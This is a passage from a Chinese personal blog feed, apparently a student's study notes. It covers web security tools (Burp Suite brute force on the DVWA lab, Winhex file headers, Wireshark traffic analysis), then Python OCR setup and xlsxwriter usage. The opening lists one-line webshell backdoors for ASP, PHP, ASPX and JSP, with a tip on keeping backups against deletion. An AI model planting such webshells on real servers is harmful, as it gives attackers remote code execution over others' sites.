<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asp一句话木马：</span><br><span class="line">&lt;%execute(request(&quot;value&quot;))%&gt;</span><br><span class="line"></span><br><span class="line">php一句话木马：</span><br><span class="line">&lt;?php eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">aspx一句话木马：</span><br><span class="line">&lt;%@ Page Language=&quot;Jscript&quot;%&gt;</span><br><span class="line">&lt;%eval(Request.Item[&quot;value&quot;])%&gt;</span><br><span class="line"></span><br><span class="line">jsp一句话木马：</span><br><span class="line">＜%  </span><br><span class="line">f(request.getParameter(&quot;f&quot;)!=null)(new java.io.FileOutputStream(application.getRealPath(&quot;//&quot;)+request.getParameter(&quot;f&quot;))).write(request.getParameter(&quot;t&quot;).getBytes());  </span><br><span class="line">%＞</span><br></pre></td></tr></table></figure>
<p><em>Webshell要做好备份，因为经常会被电脑检测然后删掉</em></p>
<p><em>webshell就是以asp、php、jsp等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。</em></p>
<p><em>PHP、eval、post这几个部分组成的 “”里就是连接要用到的密码</em></p>
<h1>burp suite</h1>
<p>Burp Suite 是用于攻击web应用程序的集成平台。它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架。</p>
<h2 id="Proxy">Proxy</h2>
<p>Proxy代理模块作为BurpSuite的核心功能，拦截HTTP/S的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流。</p>
<p>Burp 代理允许你通过监视和操纵应用程序传输的关键参数和其他数据来查找和探索应用程序的漏洞。通过以恶意的方式修改浏览器的请求，Burp 代理可以用来进行攻击，如：SQL 注入，cookie 欺骗，提升权限，会话劫持，目录遍历，缓冲区溢出。拦截的传输可以被修改成原始文本，也可以是包含参数或者消息头的表格，也可以十六进制形式，甚至可以操纵二进制形式的数据。在 Burp 代理可以呈现出包含 HTML 或者图像数据的响应消息。</p>
<h3 id="intercept">intercept</h3>
<ul>
<li>
<p>intercept：用于显示和修改Http请求和相应，通过你的浏览器和web服务器之间拦截流量实现功能，在Proxy的选项中，可以配置拦截规则来确定是什么请求和相应被拦截（例如，范围内的项目，特定文件扩展名、项目要求与参数）</p>
</li>
<li>
<p>forword：将请求包发出</p>
</li>
<li>
<p>drop：丢掉请求包</p>
</li>
<li>
<p>intercept is on/off：截断的开关</p>
</li>
<li>
<p>Action：对请求包的一些操作，我们对包体的任何修改都可以在这个窗口内进行直接修改，然后发送</p>
</li>
<li>
<p>Raw：常规数据包模式</p>
</li>
<li>
<p>header：请求头</p>
</li>
<li>
<p>Hex：十六进制数据</p>
</li>
</ul>
<h3 id="http-history">http history</h3>
<p>模块里面是我们打开burpsuite代理以来所有的http请求，我们有时候验证漏洞成功了但是复现不成功这种场景都可以在这里面进行请求的回看。</p>
<h3 id="option">option</h3>
<p>在options选项我们可以设置请求的监听和拦截截断客户段的请求和服务端的返回以及websocket 请求的截断。在此处我们可以修改我们监听的ip和端口，有时候我们burpsuite的请求包截取不到可能就是因为此处有问题，端口冲突等等</p>
<h2 id="Intrude">Intrude</h2>
<ul>
<li>
<p>attack type：攻击模式设置</p>
</li>
<li>
<p>sniper：对变量依次进行破解。多个标记依次进行。</p>
</li>
<li>
<p>battering ram：对变量同时进行破解。多个标记同时进行。</p>
</li>
<li>
<p>pitchfork：每一个变量标记对应一个字典，取每个字典的对应项。</p>
</li>
<li>
<p>cluster bomb：对每个变量对应一个字典，并且进行交集，并且进行交叉爆破，尝试各种组合。</p>
</li>
</ul>
<p><strong>Payload：</strong></p>
<ul>
<li>
<p>Payload Sets Payload数量类型设置</p>
</li>
<li>
<p>Payload Opetions[Simple list]  该选项会根据选项1中Payload type的设置而改变</p>
</li>
<li>
<p>Payload Processing 对生成的Payload进行编码、加密、截取等操作</p>
</li>
<li>
<p>Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。</p>
</li>
</ul>
<h2 id="Repeater">Repeater</h2>
<p>重放数据包。</p>
<p>一般修改参数，然后重放数据包，查看返回结果。</p>
<h2 id="抓包示例">抓包示例</h2>
<blockquote>
<p>DVWA-brute force-low</p>
</blockquote>
<ul>
<li><code>Intercept On</code></li>
<li>foxy proxy选择对应模式</li>
</ul>
<img src="/2024/12/02/web-commontools-install/image-20241202233318301.png" class="" title="image-20241202233318301">
<p>右击，转到 intrude 板块，设置账号、密码为指定对象：（这里Cluster bomb 是 扫描1字典*2字典 次数，也就是username 和 password 的扫描完全独立。）</p>
<p>分别设置字典。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202233723759.png" class="" title="image-20241202233723759">
<p>进行暴力破解。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202233916212.png" class="" title="image-20241202233916212">
<p>登录成功的显示。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202234020235.png" class="" title="image-20241202234020235">
<p>也能直接抓包重放。</p>
<img src="/2024/12/02/web-commontools-install/image-20241202234221305.png" class="" title="image-20241202234221305">
<h1>Winhex查看文件</h1>
<table>
<thead>
<tr>
<th>常见文件</th>
<th>16进制格式</th>
<th>ASCII字符</th>
</tr>
</thead>
<tbody>
<tr>
<td>JPG</td>
<td>文件头：FFD8；文件尾：FFD9</td>
<td>jpg</td>
</tr>
<tr>
<td>PNG</td>
<td>文件头：89504E47；文件尾：AE426082</td>
<td>png</td>
</tr>
<tr>
<td>ZIP/DOCX/XLS</td>
<td>文件头：504B0304</td>
<td>pk</td>
</tr>
<tr>
<td>……</td>
<td>……</td>
<td>……</td>
</tr>
</tbody>
</table>
<ul>
<li>两个主界面
<ul>
<li>左：文件16进制格式</li>
<li>右：16进制转换成ASCII字符</li>
</ul>
</li>
<li>搜索去定位数据
<ul>
<li>16进制数值：往往提取可能存在的追加文件</li>
<li>字符串：存在<code>flag&#123;</code>或者一些关键字转码（编码）</li>
</ul>
</li>
</ul>
<h1>流量分析流程</h1>
<h2 id="三个界面">三个界面</h2>
<ul>
<li>
<p>分组列表：着色区域，提供关键数据显示，ip跟Info……</p>
</li>
<li>
<p>分组详情：基于协议进行报文拆分，按照从底层到顶层（相对来说，更关注靠近顶层的协议，TCP/UDP及以上的协议）</p>
</li>
<li>
<p>分组字节流：数据包的原始数据（数据量最全），作为<strong>查找区域</strong></p>
</li>
</ul>
<h2 id="总体分析"><strong>总体分析</strong></h2>
<ul>
<li>协议分级：筛选出关键协议
<ul>
<li>发现流量包中都是<strong>常见协议</strong>，我们主要关注相对靠上层<strong>占比相对更多</strong>的协议。</li>
<li>发现流量包中存在<strong>不常见协议</strong>，去关注<strong>占比相对更少</strong>的协议。</li>
</ul>
</li>
<li>会话：筛选出关键会话。
<ul>
<li>通过<strong>分组排序</strong>，把关键会话筛选出来。</li>
<li>相对来说看分组数量更多/更少的会话</li>
</ul>
</li>
<li>端点（<strong>网络攻击行为</strong>中相对较多）：筛选出某个关键IP，<strong>角色</strong>区分：服务器角色、普通用户、攻击者
<ul>
<li>数据量最多：服务器</li>
<li>数据量相对较多：攻击者</li>
<li>数据量较少：正常用户</li>
</ul>
</li>
</ul>
<h2 id="详细分析"><strong>详细分析</strong></h2>
<ul>
<li>
<p>基于<strong>已知流量</strong>进行过滤，在总体分析的基础之上进行查看</p>
</li>
<li>
<p>基于<strong>分析信息</strong>进行过滤，根据<strong>过滤语句</strong>进行过滤</p>
<ul>
<li>
<p>基于协议：ftp/http</p>
</li>
<li>
<p>基于ip：ip.addr/src/dst == xxx</p>
</li>
<li>
<p>通过报文类型进行筛选：<code>http.request.method == GET/POST</code>/<code>http.response.code == 200/404/302</code></p>
<ul>
<li>登录场景：302</li>
</ul>
</li>
</ul>
</li>
<li>
<p>追踪流</p>
<ul>
<li>版本较老的wireshark，直接推荐TCP追踪流</li>
<li>版本新的wireshark，优先TCP，但HTTP一般也能达成目的</li>
<li>HTTP在TCP基础之上，去除了部分信息。对需要提取的数据不太明确的情况下，推荐HTTP追踪流；相对明确文件数据，推荐更全的TCP追踪流。</li>
</ul>
</li>
</ul>
<h2 id="数据提取"><strong>数据提取</strong></h2>
<ul>
<li>
<p>字符串提取</p>
</li>
<li>
<p>文件提取</p>
</li>
<li>
<p>追踪流分析出来的信息进行提取</p>
</li>
<li>
<p>导出对象：HTTP/FTP</p>
</li>
</ul>
]]></content>
      <categories>
        <category>Configuration</category>
      </categories>
      <tags>
        <tag>Environment</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-OCR-Study</title>
    <url>/2024/08/08/Python-OCR-Study/</url>
    <content><![CDATA[<p>Python OCR相关环境的安装以及搭建。<br>主要用到的是pytesseract。</p>
<span id="more"></span><!--toc-->

<h1 id="pytesseract"><a href="#pytesseract" class="headerlink" title="pytesseract"></a>pytesseract</h1><blockquote>
<p>理论上python3.8及以上就可以了。</p>
</blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 安装</li>
<li><input checked="" disabled="" type="checkbox"> 脚本相关运行</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote>
<p><a href="https://digi.bib.uni-mannheim.de/tesseract/">Index of &#x2F;tesseract (uni-mannheim.de)</a><br>选择最新的进行下载，相对各个库都会下载到最新的版本。</p>
</blockquote>
<p><strong>!</strong> 安装过程中需要把<strong>中文的训练模型</strong>进行下载，最好就是把中文简体相关等下载下来。<br><strong>! 需要配置环境变量</strong></p>
<ul>
<li>Path中添加<code>..\Tesseract-OCR</code><ul>
<li>用户变量</li>
<li>系统变量</li>
</ul>
</li>
<li>新建变量名<code>TESSDATA_PREFIX</code><ul>
<li>系统变量</li>
</ul>
</li>
</ul>
<p>打开命令行界面，运行<code>tesseract -v</code>，如果能正常显示安装的tesseract的版本信息，即说明安装成功。</p>
<p>不知道为啥，有时候把环境搭建好了稍微处理一下就又无法运行了，目前没什么合适的解决方式，直接卸载重新装<code>tesseract</code>，然后再把对应的训练模型进行下载。</p>
<h2 id="英文"><a href="#英文" class="headerlink" title="英文"></a>英文</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> pytesseract  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 配置pytesseract  </span></span><br><span class="line">pytesseract.pytesseract.tesseract_cmd = <span class="string">&#x27;D:\\Tesseract-OCR\\tesseract.exe&#x27;</span>  <span class="comment"># 修改为你的tesseract安装路径  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 读取图片文件夹  </span></span><br><span class="line">image_folder = <span class="string">&#x27;test&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 获取文件列表  </span></span><br><span class="line">image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(image_folder) <span class="keyword">if</span> os.path.isfile(os.path.join(image_folder, f))]  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 处理图片并保存结果  </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ocr_results_en.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> image_files:  </span><br><span class="line">        file_path = os.path.join(image_folder, file_name)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 读取图片  </span></span><br><span class="line">        image = cv2.imread(file_path)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 使用Tesseract进行OCR识别  </span></span><br><span class="line">        text = pytesseract.image_to_string(image, lang=<span class="string">&#x27;eng&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 写入结果到文件  </span></span><br><span class="line">        f.write(<span class="string">f&quot;File: <span class="subst">&#123;file_name&#125;</span>\n&quot;</span>)  </span><br><span class="line">        f.write(<span class="string">f&quot;Text: <span class="subst">&#123;text&#125;</span>\n&quot;</span>)  </span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<h2 id="中文"><a href="#中文" class="headerlink" title="中文"></a>中文</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2  </span><br><span class="line"><span class="keyword">import</span> pytesseract  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 配置pytesseract  </span></span><br><span class="line">pytesseract.pytesseract.tesseract_cmd = <span class="string">&#x27;D:\\Tesseract-OCR\\tesseract.exe&#x27;</span>  <span class="comment"># 修改为你的tesseract安装路径  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment"># 读取图片文件夹  </span></span><br><span class="line">image_folder = <span class="string">&#x27;test&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 获取文件列表  </span></span><br><span class="line">image_files = [f <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(image_folder) <span class="keyword">if</span> os.path.isfile(os.path.join(image_folder, f))]  </span><br><span class="line">  </span><br><span class="line"><span class="comment"># 处理图片并保存结果  </span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;ocr_results_zh.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> image_files:  </span><br><span class="line">        file_path = os.path.join(image_folder, file_name)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 读取图片  </span></span><br><span class="line">        image = cv2.imread(file_path)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 使用Tesseract进行OCR识别  </span></span><br><span class="line">        text = pytesseract.image_to_string(image, lang=<span class="string">&#x27;chi_sim&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># 写入结果到文件  </span></span><br><span class="line">        f.write(<span class="string">f&quot;File: <span class="subst">&#123;file_name&#125;</span>\n&quot;</span>)  </span><br><span class="line">        f.write(<span class="string">f&quot;Text: <span class="subst">&#123;text&#125;</span>\n&quot;</span>)  </span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="comment"># 默认保存编码为gbk的，如果需要转换常用编码utf8的，直接在写入到新文件中以utf-8的编码保存即可。</span></span><br></pre></td></tr></table></figure>

<h1 id="Paddle"><a href="#Paddle" class="headerlink" title="Paddle"></a>Paddle</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install paddleocr -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br><span class="line">pip install paddle -i http://mirrors.aliyun.com/pypi/simple/ --trusted-host mirrors.aliyun.com</span><br></pre></td></tr></table></figure>

<p><em>理论上直接按照这种进行pip安装即可。</em></p>
<p>但是安装<code>paddle</code>会出现<code> error: subprocess-exited-with-error</code>报错，意思说是<code>subprocess</code>模块啥的安装失败。</p>
<p>emmm</p>
<blockquote>
<p>坑：shapely 的版本必须必须必须是 1.7.1 ，不能比这高！！！requirements.txt 也没有这个提示。如果比这个版本高，不会正常运行，而且还不会报错，而是返回 ‘退出代码为 -1073741819 (0xC0000005) 的字样’。 泪奔了，找了2天终于解决了…</p>
</blockquote>
<p>原文链接：<a href="https://blog.csdn.net/Fan_shine/article/details/123089196">https://blog.csdn.net/Fan_shine/article/details/123089196</a></p>
<blockquote>
<p><a href="https://github.com/PaddlePaddle/PaddleOCR/issues/212">Win10 CPU环境，OSError: [WinError 126] 找不到指定的模块 · Issue #212 · PaddlePaddle&#x2F;PaddleOCR · GitHub</a></p>
</blockquote>
<p>shapely，下载地址：</p>
<blockquote>
<p><a href="https://pypi.tuna.tsinghua.edu.cn/simple/shapely/">Links for shapely (tsinghua.edu.cn)</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>OCR</tag>
        <tag>tesseract</tag>
        <tag>pytesseract</tag>
        <tag>paddle</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-Xlsx-Study</title>
    <url>/2024/08/14/Python-xlsx-Study/</url>
    <content><![CDATA[<p>Python里面涉及xlsx文件的相关操作。</p>
<p>记录一下。</p>
<span id="more"></span><!--toc-->

<p>#Python&#x2F;xlsx</p>
<p>Reference: <a href="https://blog.csdn.net/ixusy88/article/details/106742403">Python3之excel操作–xlsxwriter模块_python 3 xlswriter-CSDN博客</a></p>
<!--more--><!--toc-->

<h1 id="相关库安装"><a href="#相关库安装" class="headerlink" title="相关库安装"></a>相关库安装</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pip install xlsxwriter</span><br></pre></td></tr></table></figure>


<h1 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作"></a>常用操作</h1><h2 id="创建工作簿、工作表"><a href="#创建工作簿、工作表" class="headerlink" title="创建工作簿、工作表"></a>创建工作簿、工作表</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建工作簿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#创建一个excel文件</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 创建工作表</span></span><br><span class="line">worksheet = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#在文件中创建一个名为test-sheet1的sheet,不加名字默认为sheet1</span></span><br><span class="line">worksheet2 = workbook.add_worksheet()   <span class="comment">#  Sheet2</span></span><br><span class="line">worksheet3 = workbook.add_worksheet(<span class="string">&#x27;test-sheet2&#x27;</span>)</span><br><span class="line">worksheet4 = workbook.add_worksheet()  <span class="comment">#  Sheet4</span></span><br><span class="line"> </span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h2 id="单元格填值"><a href="#单元格填值" class="headerlink" title="单元格填值"></a>单元格填值</h2><h3 id="单个单元格"><a href="#单个单元格" class="headerlink" title="单个单元格"></a>单个单元格</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 一：创建工作簿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#创建一个excel文件</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 二：创建工作表</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#在文件中创建一个名为test-sheet1的sheet,不加名字默认为sheet1</span></span><br><span class="line">worksheet2 = workbook.add_worksheet()   <span class="comment">#  Sheet2</span></span><br><span class="line">worksheet3 = workbook.add_worksheet(<span class="string">&#x27;test-sheet2&#x27;</span>)</span><br><span class="line">worksheet4 = workbook.add_worksheet()  <span class="comment">#  Sheet4</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 三：设置单元格的值</span></span><br><span class="line">worksheet1.write(<span class="string">&#x27;A1&#x27;</span>, <span class="string">&#x27;hello123&#x27;</span>)  <span class="comment"># 在A1单元格写上HELLO</span></span><br><span class="line">worksheet1.write(<span class="string">&#x27;A2&#x27;</span>, <span class="string">&#x27;123测试456&#x27;</span>)  <span class="comment"># 在B2上写上中文加粗</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用行列方式,下标从0开始</span></span><br><span class="line">worksheet1.write(<span class="number">2</span>, <span class="number">0</span>, <span class="number">100</span>) <span class="comment">#  第3行第1列（即A3） 写入100</span></span><br><span class="line">worksheet1.write(<span class="number">3</span>, <span class="number">0</span>, <span class="number">99.8</span>)  <span class="comment">#  第4行第1列（即A4） 写入99.8</span></span><br><span class="line">worksheet1.write(<span class="number">4</span>, <span class="number">0</span>, <span class="string">&#x27;=SUM(A3:A4)&#x27;</span>)  <span class="comment"># 写上excel公式</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 合并单元格</span></span><br><span class="line">worksheet1.merge_range(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="string">&#x27;合并01&#x27;</span>)</span><br><span class="line">worksheet1.merge_range(<span class="string">&#x27;C6:E7&#x27;</span>,<span class="string">&#x27;合并02&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_number：写入数字</span></span><br><span class="line">worksheet1.write_number(<span class="number">5</span>, <span class="number">0</span>, <span class="number">1001</span>)  <span class="comment">#   Int or float</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_blank：写入空格</span></span><br><span class="line">worksheet1.write_blank(<span class="number">6</span>, <span class="number">0</span>,<span class="string">&#x27;xx&#x27;</span>)  <span class="comment"># 不管第三个参数是什么，都写入空格</span></span><br><span class="line"><span class="comment"># worksheet1.write_formula：写入公式</span></span><br><span class="line">worksheet1.write_formula(<span class="number">7</span>, <span class="number">0</span>, <span class="string">&#x27;=SUM(A3:A4)&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_datetime：写入时间格式</span></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">date_format = workbook.add_format(&#123;<span class="string">&#x27;num_format&#x27;</span>: <span class="string">&#x27;yyyy-mm-dd H:M:S&#x27;</span>&#125;)</span><br><span class="line">worksheet1.write_datetime(<span class="number">8</span>, <span class="number">0</span>, datetime.today(),date_format )</span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_boolean:写入逻辑数据</span></span><br><span class="line">worksheet1.write_boolean(<span class="number">9</span>, <span class="number">0</span>,<span class="literal">False</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># worksheet1.write_url:写入链接地址</span></span><br><span class="line">worksheet1.write_url(<span class="number">10</span>, <span class="number">0</span>,<span class="string">&#x27;www.baidu.com&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h3 id="多个单元格"><a href="#多个单元格" class="headerlink" title="多个单元格"></a>多个单元格</h3><blockquote>
<p>以<strong>列表</strong>形式进行数值填入。<br>只要填充位置以及填充数值足够清晰就可以完成相关数值的写入。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 一：创建工作簿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#创建一个excel文件</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 二：创建工作表</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#在文件中创建一个名为test-sheet1的sheet,不加名字默认为sheet1</span></span><br><span class="line"><span class="comment"># worksheet2 = workbook.add_worksheet()   #  Sheet2</span></span><br><span class="line"><span class="comment"># worksheet3 = workbook.add_worksheet(&#x27;test-sheet2&#x27;)</span></span><br><span class="line"><span class="comment"># worksheet4 = workbook.add_worksheet()  #  Sheet4</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # write_row 写入</span></span><br><span class="line">lst=[<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;78&#x27;</span>]</span><br><span class="line">worksheet1.write_row(<span class="number">5</span>, <span class="number">0</span>, lst)  <span class="comment"># 把数据写到第6行的，从第1列开始到第4列上</span></span><br><span class="line"><span class="comment"># # write_column 写入</span></span><br><span class="line">worksheet1.write_column(<span class="number">6</span>, <span class="number">0</span>,lst) <span class="comment"># 把数据写到第1列，从第7行开始到第10行上</span></span><br><span class="line"> </span><br><span class="line">workbook.close()</span><br></pre></td></tr></table></figure>

<h2 id="设置格式"><a href="#设置格式" class="headerlink" title="设置格式"></a>设置格式</h2><h3 id="设置单元格样式"><a href="#设置单元格样式" class="headerlink" title="设置单元格样式"></a>设置单元格样式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 一：创建工作簿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#创建一个excel文件</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 二：创建工作表</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#在文件中创建一个名为test-sheet1的sheet,不加名字默认为sheet1</span></span><br><span class="line"><span class="comment"># worksheet2 = workbook.add_worksheet()   #  Sheet2</span></span><br><span class="line"><span class="comment"># worksheet3 = workbook.add_worksheet(&#x27;test-sheet2&#x27;)</span></span><br><span class="line"><span class="comment"># worksheet4 = workbook.add_worksheet()  #  Sheet4</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 大部分样式如下：</span></span><br><span class="line"><span class="built_in">format</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;font_size&#x27;</span>: <span class="number">10</span>,  <span class="comment"># 字体大小</span></span><br><span class="line">    <span class="string">&#x27;bold&#x27;</span>: <span class="literal">True</span>,  <span class="comment"># 是否粗体</span></span><br><span class="line">    <span class="comment"># &#x27;bg_color&#x27;: &#x27;#101010&#x27;,  # 表格背景颜色</span></span><br><span class="line">    <span class="string">&#x27;fg_color&#x27;</span>: <span class="string">&#x27;#00FF00&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;font_color&#x27;</span>: <span class="string">&#x27;#0000FF&#x27;</span>,  <span class="comment"># 字体颜色</span></span><br><span class="line">    <span class="string">&#x27;align&#x27;</span>: <span class="string">&#x27;center&#x27;</span>,  <span class="comment"># 水平居中对齐</span></span><br><span class="line">    <span class="string">&#x27;valign&#x27;</span>: <span class="string">&#x27;vcenter&#x27;</span>,  <span class="comment"># 垂直居中对齐</span></span><br><span class="line">    <span class="comment"># &#x27;num_format&#x27;: &#x27;yyyy-mm-dd H:M:S&#x27;,# 设置日期格式</span></span><br><span class="line">    <span class="comment"># 后面参数是线条宽度</span></span><br><span class="line">    <span class="string">&#x27;border&#x27;</span>: <span class="number">1</span>, <span class="comment"># 边框宽度</span></span><br><span class="line">    <span class="string">&#x27;top&#x27;</span>: <span class="number">1</span>,  <span class="comment"># 上边框</span></span><br><span class="line">    <span class="string">&#x27;left&#x27;</span>: <span class="number">1</span>,  <span class="comment"># 左边框</span></span><br><span class="line">    <span class="string">&#x27;right&#x27;</span>: <span class="number">1</span>,  <span class="comment"># 右边框</span></span><br><span class="line">    <span class="string">&#x27;bottom&#x27;</span>: <span class="number">1</span>  <span class="comment"># 底边框</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">style = workbook.add_format(<span class="built_in">format</span>)   <span class="comment"># 设置样式format是一个字典</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># # write_row 写入</span></span><br><span class="line">lst=[<span class="string">&#x27;12&#x27;</span>,<span class="string">&#x27;34&#x27;</span>,<span class="string">&#x27;56&#x27;</span>,<span class="string">&#x27;78&#x27;</span>]</span><br><span class="line">worksheet1.write_row(<span class="number">5</span>, <span class="number">0</span>, lst,style)  <span class="comment"># 把数据写到第6行的，从第1列开始到第4列上</span></span><br><span class="line"><span class="comment"># # write_column 写入</span></span><br><span class="line">worksheet1.write_column(<span class="number">6</span>, <span class="number">0</span>,lst) <span class="comment"># 把数据写到第1列，从第7行开始到第10行上</span></span><br><span class="line">worksheet1.write(<span class="string">&#x27;A1&#x27;</span>,<span class="number">200</span>,style)</span><br><span class="line">worksheet1.write(<span class="number">2</span>,<span class="number">0</span>,<span class="number">900</span>,style)</span><br><span class="line">workbook.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="设置单元格行高、列宽"><a href="#设置单元格行高、列宽" class="headerlink" title="设置单元格行高、列宽"></a>设置单元格行高、列宽</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=gbk</span></span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 一：创建工作簿</span></span><br><span class="line">workbook = xlsxwriter.Workbook(<span class="string">&#x27;test.xlsx&#x27;</span>)<span class="comment">#创建一个excel文件</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 二：创建工作表</span></span><br><span class="line">worksheet1 = workbook.add_worksheet(<span class="string">&#x27;test-sheet1&#x27;</span>)<span class="comment">#在文件中创建一个名为test-sheet1的sheet,不加名字默认为sheet1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 设置行宽</span></span><br><span class="line">worksheet1.set_row(<span class="number">0</span>,<span class="number">60</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 设置列宽</span></span><br><span class="line">worksheet1.set_column(<span class="number">1</span>,<span 